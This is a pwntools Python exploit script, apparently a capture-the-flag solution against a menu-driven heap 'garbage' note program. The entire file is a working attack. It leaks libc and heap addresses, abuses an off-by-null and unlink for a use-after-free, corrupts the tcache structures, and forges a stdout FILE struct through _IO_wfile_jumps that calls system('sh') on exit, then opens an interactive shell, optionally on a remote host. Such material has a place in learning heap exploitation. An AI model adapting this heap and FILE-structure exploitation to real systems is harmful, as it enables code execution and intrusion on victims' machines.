from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './pwn'
exe = ELF(fname)
context.binary = exe

DEFAULT_LIB = {'i386':'/lib/i386-linux-gnu/libc.so.6', 'amd64':'/lib/x86_64-linux-gnu/libc.so.6'}
DEFAULT_LDSO = {'i386':'/lib/i386-linux-gnu/ld-linux.so.2', 'amd64':'/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'}
libname = args.LIB if args.LIB else DEFAULT_LIB[context.arch]
ldname = args.LDSO if args.LDSO else DEFAULT_LDSO[context.arch]
libc = ELF(libname)
ldso = ELF(ldname)

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'your choice: ', str(idx).encode())

def add(idx, sz, content):
    opt(1)
    sla(b'pls input the idx of garbage: ', str(idx).encode())
    sla(b'pls input the size of garbage: ', str(sz).encode())
    sa(b'pls input the content of garbage: ', content)

def edit(idx, content):
    opt(4)
    sla(b'pls input the idx of garbage: ', str(idx).encode())
    sa(b'pls input the new content of garbage: ', content)

def show(idx):
    opt(3)
    sla(b'pls input the idx of garbage: ', str(idx).encode())

def delete(idx):
    opt(2)
    sla(b'pls input the idx of garbage: ', str(idx).encode())

def exp():
    note_addr = exe.sym.note
    sizes_addr = exe.sym.byte
    
    # leak libc
    add(0, 0x418, b'aaa')
    add(1, 0x418, b'bbb')
    delete(0)
    add(0, 0x418, b'a'*8)
    show(0)
    fd = u64(rl()[-7:-1].ljust(8, b'\0'))
    arena_off = [0x21ac80, 0x219c80][1 if args.REMOTE else 0]
    libc.address = fd - 96 - arena_off
    log.success(f'========== libc@ {hex(libc.address)}')
    
    # off-by-null and unlink to get UAF
    add(2, 0x4f8, b'ccc')
    add(3, 0x418, b'ddd')
    edit(0, flat([0, 0x831, note_addr - 0x18, note_addr - 0x10, 0, 0])+b'\n')
    edit(1, flat({0x410:0x830}))
    delete(2) # note'[0] ==> note[-3]
    
    add(2, 0x418, b'e'*16)
    add(4, 0x4f8, b'f'*16)
    show(2)
    ru(b'e'*16)
    heap_addr = u64(rl()[:-1].ljust(8, b'\0'))
    heap_base = heap_addr - 0x2a0
    tcache_addr = heap_base + 0x10
    log.success(f'=========== tcache={hex(tcache_addr)}')


    # hijack tcache_prethread_struct
    mp_off = [0x21a360, 0x219360][1 if args.REMOTE else 0]
    mp_addr = libc.address + mp_off
    mp_tcache_bin_addr = mp_addr + 0x68
    edit(0, flat([0, 0, 0, tcache_addr, mp_tcache_bin_addr])[:-1]+b'\n')
    edit(0, p16(7)*64+p64(libc.sym._IO_2_1_stdout_)*80+b'\n')
    edit(1, p64(0xdeadbeef00) + b'\n') # modify mp_.tcache_bins
    
    fake_FILE_addr = libc.sym._IO_2_1_stdout_ #heap_base + 0x2b0
    _wide_data = fake_FILE_addr + 8
    _wide_vtable = _wide_data + 0xe0 - 0x60
    # Calling chain: 
    # exit()
    #  |-- _IO_flush_all_lockp()
    #       |-- _IO_OVERFLOW(fp) ==> _IO_wfile_jumps.__overflow()
    #           |-- _IO_wdoallocbuf(fp) ==> fp->_wide_data->_wide_table->__doallocate: offset +0x68 from vtable
    # Requirements:
    #   _flags &= ~(2|8|0x800)
    #   mode > 0    : for _IO_flush_all_lockp() -> _IO_OVERFLOW(fp)
    #   _wide_data->_IO_write_base = 0
    #   _wide_data->_IO_write_ptr > _wide_data->_IO_write_base
    #   _wide_data->_IO_buf_base = 0
    #   fp->_vtable_offset = 0
    fake_FILE = flat([
        b'  sh'.ljust(8, b' '), # _flags &= ~(2|8|0x800), u64(b'  sh')==0x68732020
        0, 0, 0, # _IO_read_ptr, _IO_read_end, _IO_read_base
        0, # _IO_write_base
        1, # RDX = _IO_write_ptr,
        2, # _IO_write_end
        [0] * 6, 
        0, # +0x68, _chain
        [0] * 3, 
        libc.sym._IO_2_1_stdout_ + 0x12f0, # +0x88 _lock: writtable addr is OK.
        [0]*2,
        _wide_data, # +0xa0: _wide_data = fake_FILE+8
        [0] * 3, 
        -1, # +0xc0: _mode
        [0] * 2, 
        libc.sym._IO_wfile_jumps, # +0xd8: RAX = _vtable
        # fake_FILE end, but fake_IO_wide_data still have some members.
        0,
        _wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable
        libc.sym.system,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__doallocate(fp)
    ])

    bpt()
    add(5, 0x418, fake_FILE)


if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()